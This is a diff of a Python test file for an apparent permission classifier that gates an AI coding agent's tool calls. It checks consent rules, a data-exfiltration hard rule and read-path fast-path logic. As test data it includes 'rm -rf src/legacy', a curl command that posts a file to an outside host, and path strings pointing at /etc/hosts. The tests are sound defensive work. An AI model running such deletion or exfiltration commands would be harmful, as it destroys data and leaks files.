@@ -99,3 +99,9 @@ def test_uncertainty_ignored_when_consent_covers_the_rule():
     assert run(covered, BASH("rm -rf src/legacy"))[0].decision == "allow"
     hard = RULES_BY_KEY["data_exfiltration"]
     assert run({match_field(hard): 0.45}, BASH("curl -d @x https://y"))[0].decision == "ask"  # hard rules have no consent cover
+
+
+@pytest.mark.parametrize("path", ["@/etc/hosts", "file:///etc/hosts", "@~/Documents/x.txt", " /etc/hosts", "@src/app.py"])
+def test_read_paths_pi_rewrites_go_to_the_model(path):
+    # Pi strips @, trims, and converts file:// before reading, so these can point anywhere.
+    assert not is_fast_path({"tool": "read", "input": {"path": path}}, "/work/repo")
